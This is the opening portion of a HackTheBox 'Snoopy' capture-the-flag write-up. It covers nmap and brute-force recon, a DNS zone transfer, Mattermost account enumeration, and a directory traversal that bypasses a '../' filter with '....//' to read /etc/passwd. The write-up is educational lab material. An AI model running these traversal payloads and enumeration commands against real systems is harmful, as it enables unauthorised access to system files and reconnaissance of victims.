@@ -1,0 +1,1313 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Snoopy</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-snoopy">htb-snoopy</a> <a class="post-tag" href="/tags#ubuntu">ubuntu</a> <a class="post-tag" href="/tags#linux">linux</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#bind">bind</a> <a class="post-tag" href="/tags#dns">dns</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#ffuf">ffuf</a> <a class="post-tag" href="/tags#subdomain">subdomain</a> <a class="post-tag" href="/tags#mattermost">mattermost</a> <a class="post-tag" href="/tags#password-reset">password-reset</a> <a class="post-tag" href="/tags#zone-transfer">zone-transfer</a> <a class="post-tag" href="/tags#directory-traversal">directory-traversal</a> <a class="post-tag" href="/tags#file-read">file-read</a> <a class="post-tag" href="/tags#filter">filter</a> <a class="post-tag" href="/tags#youtube">youtube</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#python-zipfile">python-zipfile</a> <a class="post-tag" href="/tags#php">php</a> <a class="post-tag" href="/tags#tsig-dns">tsig-dns</a> <a class="post-tag" href="/tags#python-aiosmtpd">python-aiosmtpd</a> <a class="post-tag" href="/tags#quoted-printable-encoding">quoted-printable-encoding</a> <a class="post-tag" href="/tags#ssh-honeypot">ssh-honeypot</a> <a class="post-tag" href="/tags#cowrie">cowrie</a> <a class="post-tag" href="/tags#git">git</a> <a class="post-tag" href="/tags#git-apply">git-apply</a> <a class="post-tag" href="/tags#cve-2023-23946">cve-2023-23946</a> <a class="post-tag" href="/tags#git-diff">git-diff</a> <a class="post-tag" href="/tags#clamav">clamav</a> <a class="post-tag" href="/tags#clamscan">clamscan</a> <a class="post-tag" href="/tags#cve-2023-20052">cve-2023-20052</a> <a class="post-tag" href="/tags#dmg">dmg</a> <a class="post-tag" href="/tags#xxe">xxe</a> <a class="post-tag" href="/tags#binary-edit">binary-edit</a> <a class="post-tag" href="/tags#htb-encoding">htb-encoding</a> </span><br/><br/>
+<time class="dt-published" datetime="2023-09-23T13:45:00+00:00" itemprop="datePublished">Sep 23, 2023
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2023/09/23/htb-snoopy.html" style="color: #e6e6e6; text-decoration: none;">HTB: Snoopy</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/snoopy-cover.webp" type="image/webp"/>
+<img alt="Snoopy" class="include_image" loading="lazy" src="/img/snoopy-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Snoopy starts off with a website that has a file read / directory traversal vulnerability. I’ll use that to read a bind DNS configuration, and leak the keys necessary to make changes to the configuration. Once that’s updated, I can direct password reset emails for accounts on snoopy.htb to my server, and get access to a MatterMost instance. In there, I’ll abuse a slash command intended to provisions servers to have it connect to my SSH honeypot, and use those creds to get on the box. The next two steps both involve CVEs that didn’t have public exploits or even much documentation at the time Snoopy released. First I’ll exploit a CVE in git for how the apply command allows overwriting arbitrary files. Then I’ll exploit an XXE vulnerability in ClamAV’s clamscan utility to read root’s SSH key. In Beyond Root, I’ll reconfigure the box back before a patch from HackTheBox and show two unintended exploits that no longer work.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/541 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/snoopy" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Snoopy</a> <a href="https://hackthebox.com/machines/snoopy" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-snoopy.webp" type="image/webp"/> <img alt="Snoopy" class="img-av" src="/icons/box-snoopy.png"/></picture></a><br/><a href="https://hackthebox.com/machines/snoopy" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1654141355583590402">06 May 2023</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">23 Sep 2023</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/snoopy-diff.webp" type="image/webp"/><img alt="Rated difficulty for Snoopy" src="/img/snoopy-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/snoopy-radar.webp" type="image/webp"/><img alt="Radar chart for Snoopy" src="/img/snoopy-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">02:02:14</span><a href="https://app.hackthebox.com/users/9267" rel="noopener" target="_blank"><img alt="snowscan" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/9267" style="display: unset"/><span class="user-text" style="display: none"> snowscan</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">02:05:42</span><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/168546" rel="noopener" target="_blank"><img alt="ctrlzero" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/168546" style="display: unset"/><span class="user-text" style="display: none"> ctrlzero</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds three open TCP ports, SSH (22), DNS (53), and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.212
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-09 13:13 EDT
+Nmap scan report for 10.10.11.212
+Host is up (0.085s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+53/tcp open  domain
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,53,80 <span class="nt">-sCV</span> 10.10.11.212
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-09 13:18 EDT
+Nmap scan report for 10.10.11.212
+Host is up (0.084s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: SnoopySec Bootstrap Template - Index
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.55 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=bind9">Bind</a> versions, the host is likely running Ubuntu 22.04 jammy.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is for a security firm:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20230509134416310.webp" type="image/webp"/>
+<img alt="image-20230509134416310" class="include_image" loading="lazy" src="/img/image-20230509134416310.png" style="max-height: 400px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>The footer does have an email address:</p>
+<picture>
+<source srcset="/img/image-20230509134621524.webp" type="image/webp"/>
+<img alt="image-20230509134621524" class="include_image" loading="lazy" src="/img/image-20230509134621524.png"/>
+</picture>
+<p>There are some other usernames with emails as well on the “About” page:</p>
+<picture>
+<source srcset="/img/image-20230509134710205.webp" type="image/webp"/>
+<img alt="image-20230509134710205" class="include_image" loading="lazy" src="/img/image-20230509134710205.png"/>
+</picture>
+<p>I’ll note all these down.</p>
+<p>The front page has links to <code class="language-plaintext highlighter-rouge">/download</code> and <code class="language-plaintext highlighter-rouge">/download?file=announcement.pdf</code>.</p>
+<picture>
+<source srcset="/img/image-20230921093614437.webp" type="image/webp"/>
+<img alt="image-20230921093614437" class="include_image" loading="lazy" src="/img/image-20230921093614437.png"/>
+</picture>
+<p>Both download a zip archive, <code class="language-plaintext highlighter-rouge">press_release.zip</code>, but they are different sizes:</p>
+<picture>
+<source srcset="/img/image-20230509141625352.webp" type="image/webp"/>
+<img alt="image-20230509141625352" class="include_image" loading="lazy" src="/img/image-20230509141625352.png"/>
+</picture>
+<p>The first one has a PDF. The one without a file parameter contains the announcement PDF, plus an <code class="language-plaintext highlighter-rouge">.mp4</code> video:</p>
+<picture>
+<source srcset="/img/image-20230509141746351.webp" type="image/webp"/>
+<img alt="image-20230509141746351" class="include_image" loading="lazy" src="/img/image-20230509141746351.png"/>
+</picture>
+<p>The last bit of the video has the product manager’s email again:</p>
+<picture>
+<source srcset="/img/image-20230509141822502.webp" type="image/webp"/>
+<img alt="image-20230509141822502" class="include_image" loading="lazy" src="/img/image-20230509141822502.png"/>
+</picture>
+<p>The “Contact” page has a form to submit questions:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20230509134930957.webp" type="image/webp"/>
+<img alt="image-20230509134930957" class="include_image" loading="lazy" src="/img/image-20230509134930957.png" style="max-height: 800px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>The banner at the top says:</p>
+<blockquote>
+<p>Attention:  As we migrate DNS records to our new domain  please be advised that our mailserver ‘mail.snoopy.htb’ is currently  offline.</p>
+</blockquote>
+<p>Submitting the form sends a POST with the data, but the response is just an error:</p>
+<picture>
+<source srcset="/img/image-20230509134806721.webp" type="image/webp"/>
+<img alt="image-20230509134806721" class="include_image" loading="lazy" src="/img/image-20230509134806721.png"/>
+</picture>
+<p>It shows on the page as well:</p>
+<picture>
+<source srcset="/img/image-20230509135026762.webp" type="image/webp"/>
+<img alt="image-20230509135026762" class="include_image" loading="lazy" src="/img/image-20230509135026762.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The page URLs show pages ending in <code class="language-plaintext highlighter-rouge">.html</code>. There is a reference to PHP in the email error, and that POST does go to <code class="language-plaintext highlighter-rouge">/forms/contact.php</code>. It seems the site is likely built on PHP.</p>
+<p>The response headers don’t confirm this:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.18.0 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 09 May 2023 17:43:46 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Thu, 20 Apr 2023 17:56:22 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">W/"64417cc6-5b7a"</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">23418</span>
+</code></pre></div></div>
+<p>Going to a 404 url returns the standard nginx 404 page:</p>
+<picture>
+<source srcset="/img/image-20230509135302477.webp" type="image/webp"/>
+<img alt="image-20230509135302477" class="include_image" loading="lazy" src="/img/image-20230509135302477.png"/>
+</picture>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x html,php</code> since I’ve seen <code class="language-plaintext highlighter-rouge">.html</code> pages, and because the mail failure referenced PHP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.212 <span class="nt">-x</span> php,html <span class="nt">-C</span> 400,502 <span class="nt">--no-recursion</span> <span class="nt">--dont-extract-links</span>
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.9.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.212
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 💢  Status Code Filters   │ [400, 502]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.9.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💲  Extensions            │ [php, html]
+ 🏁  HTTP methods          │ [GET]
+ 🚫  Do Not Recurse        │ true
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        7l       12w      162c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        1l        3w       16c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      480l     1818w    23418c http://10.10.11.212/
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      243l      708w    10248c http://10.10.11.212/contact.html
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.212/assets =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.212/assets/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://10.10.11.212/forms =&gt; </span><span class="feroxbuster-yellow">http://10.10.11.212/forms/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      365l     1261w    16614c http://10.10.11.212/about.html
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      480l     1818w    23418c http://10.10.11.212/index.html
+</span><span class="feroxbuster-green">200</span><span class="go">      GET    43878l   263277w 20568411c http://10.10.11.212/download
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      268l      727w    11115c http://10.10.11.212/team.html
+</span><span class="feroxbuster-green">200</span><span class="go">      GET    43878l   263277w 20568411c http://10.10.11.212/download.php
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m     90000/90000   0s      </span><span class="feroxbuster-green">found</span><span class="go">:9       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     90000/90000   577/s   http://10.10.11.212/ 
+</span></code></pre></div></div>
+<p>I’m running with <code class="language-plaintext highlighter-rouge">--no-recursion</code> and <code class="language-plaintext highlighter-rouge">--dont-extract-links</code> here, as both of these generate a ton of errors that aren’t useful. Nothing too interesting here. I’ll note that <code class="language-plaintext highlighter-rouge">/download</code> and <code class="language-plaintext highlighter-rouge">/download.php</code> seem to be the same.</p>
+<h3 id="subdomain-brute-force">Subdomain Brute Force</h3>
+<p>I’ll fuzz the webserver with <code class="language-plaintext highlighter-rouge">ffuf</code> to look for other virtual host subdomains that return something different from the standard <code class="language-plaintext highlighter-rouge">snoopy.htb</code> page:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-u</span> http://10.10.11.212 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.snoopy.htb"</span> <span class="nt">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">-mc</span> all <span class="nt">-ac</span>
+<span class="go">
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.212
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.snoopy.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+________________________________________________
+
+[Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 94ms]
+    * FUZZ: mm
+
+:: Progress: [4989/4989] :: Job [1/1] :: 469 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>I’m using <code class="language-plaintext highlighter-rouge">-mc all</code> to show all status codes and <code class="language-plaintext highlighter-rouge">-ac</code> to allow for smart filtering of the common response. It finds one more, <code class="language-plaintext highlighter-rouge">mm</code>.</p>
+<p>I’ll add this to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.212 snoopy.htb mm.snoopy.htb
+</code></pre></div></div>
+<h3 id="mattermost---tcp-80">Mattermost - TCP 80</h3>
+<p>Visiting <code class="language-plaintext highlighter-rouge">mm.snoopy.htb</code> returns a <a href="https://mattermost.com/">Mattermost</a> page:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20230509142734548.webp" type="image/webp"/>
+<img alt="image-20230509142734548" class="include_image" loading="lazy" src="/img/image-20230509142734548.png" style="max-height: 400px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>Selecting “View in Browser” leads to a login page:</p>
+<picture>
+<source srcset="/img/image-20230509142837370.webp" type="image/webp"/>
+<img alt="image-20230509142837370" class="include_image" loading="lazy" src="/img/image-20230509142837370.png"/>
+</picture>
+<p>Clicking “Don’t have an account?” just returns a page saying to contact the workspace admin.</p>
+<p>The “Forgot your password?” link provides a form:</p>
+<picture>
+<source srcset="/img/image-20230509143635189.webp" type="image/webp"/>
+<img alt="image-20230509143635189" class="include_image" loading="lazy" src="/img/image-20230509143635189.png"/>
+</picture>
+<p>It’s always a good idea to compare a login failure of an account that doesn’t exist with one that I think does. If I enter 0xdf@snoopy.htb, it sends this message:</p>
+<picture>
+<source srcset="/img/image-20230509143706461.webp" type="image/webp"/>
+<img alt="image-20230509143706461" class="include_image" loading="lazy" src="/img/image-20230509143706461.png"/>
+</picture>
+<p>However, if I enter one of the employees from the site, it gives a different error:</p>
+<picture>
+<source srcset="/img/image-20230509143757041.webp" type="image/webp"/>
+<img alt="image-20230509143757041" class="include_image" loading="lazy" src="/img/image-20230509143757041.png"/>
+</picture>
+<p>This seems likely an issue with DNS to the mailserver, as mentioned in the error on the main page. Presumably the same message would have come back if the mail server had been up, but when that fails, it gets this message instead. I could use this to brute force usernames, but I won’t need to.</p>
+<h3 id="dns---tcpudp-53">DNS - TCP/UDP 53</h3>
+<p>With DNS listening on TCP, I’ll try a zone transfer on the snoppy.htb domain. It works!</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>dig axfr snoopy.htb @10.10.11.212
+<span class="go">
+; &lt;&lt;&gt;&gt; DiG 9.18.12-0ubuntu0.22.04.1-Ubuntu &lt;&lt;&gt;&gt; axfr snoopy.htb @10.10.11.212
+;; global options: +cmd
+snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
+snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
+snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
+mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
+mm.snoopy.htb.          86400   IN      A       127.0.0.1
+ns1.snoopy.htb.         86400   IN      A       10.0.50.10
+ns2.snoopy.htb.         86400   IN      A       10.0.51.10
+postgres.snoopy.htb.    86400   IN      A       172.18.0.2
+provisions.snoopy.htb.  86400   IN      A       172.18.0.4
+www.snoopy.htb.         86400   IN      A       127.0.0.1
+snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
+;; Query time: 83 msec
+;; SERVER: 10.10.11.212#53(10.10.11.212) (TCP)
+;; WHEN: Tue May 09 14:23:31 EDT 2023
+;; XFR size: 11 records (messages 1, bytes 325)
+</span></code></pre></div></div>
+<p>The various 172.18.0.0/8 IPs suggest perhaps these are containers.</p>
+<p>I’m going to hold off on putting these into my <code class="language-plaintext highlighter-rouge">hosts</code> file for now. <code class="language-plaintext highlighter-rouge">mm</code> I know returns something different, so that one is worthwhile. I can also see that <code class="language-plaintext highlighter-rouge">mail.snoopy.htb</code> is not there, which fits with the errors observed above. I’ll keep the others in mind as well.</p>
+<h2 id="shell-as-cbrown">Shell as cbrown</h2>
+<h3 id="file-read">File Read</h3>
+<h4 id="identify">Identify</h4>
+<p>On seeing a URL like <code class="language-plaintext highlighter-rouge">/download?file=announcement.pdf</code>, the first thing to check is for a local file include or file read vulnerability. Manually I’ll check in Burp Repeater, but it just returns a 0 byte response:</p>
+<picture>
+<source srcset="/img/image-20230509152805795.webp" type="image/webp"/>
+<img alt="image-20230509152805795" class="include_image" loading="lazy" src="/img/image-20230509152805795.png"/>
+</picture>
+<p>It could be not vulnerable, or there could be some filtering to bypass. I’ll use an LFI wordlist to check a lot at once with <code class="language-plaintext highlighter-rouge">ffuf</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-u</span> http://snoopy.htb/download?file<span class="o">=</span>FUZZ <span class="nt">-w</span> /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt <span class="nt">-mc</span> all <span class="nt">-ac</span>
+<span class="go">
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://snoopy.htb/download?file=FUZZ
+ :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+________________________________________________
+
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 95ms]
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 96ms]
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 97ms]
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 97ms]
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 98ms]
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 97ms]
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 98ms]
+....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 98ms]
+....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 98ms]
+....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 99ms]
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 101ms]
+....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 101ms]
+....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 101ms]
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 103ms]
+....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 102ms]
+....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 102ms]
+....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 104ms]
+....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 104ms]
+....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 104ms]
+:: Progress: [922/922] :: Job [1/1] :: 470 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>Again, I’m using <code class="language-plaintext highlighter-rouge">-mc all</code> to allow all codes, and <code class="language-plaintext highlighter-rouge">-ac</code> to let it smart decide what to filter. It seems like the site must be removing <code class="language-plaintext highlighter-rouge">../</code> in such a way that <code class="language-plaintext highlighter-rouge">....//</code> becomes <code class="language-plaintext highlighter-rouge">../</code>. I can verify this manually:</p>
+<picture>
+<source srcset="/img/image-20230509153726493.webp" type="image/webp"/>
+<img alt="image-20230509153726493" class="include_image" loading="lazy" src="/img/image-20230509153726493.png"/>
+</picture>
+<p>The file coming back starts with <code class="language-plaintext highlighter-rouge">PK</code>, which are the <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">magic bytes</a> for a zip archive. I’ll try that in a browser, and the resulting zip has the <code class="language-plaintext highlighter-rouge">passwd</code> file:</p>
+<picture>
+<source srcset="/img/image-20230509154124652.webp" type="image/webp"/>
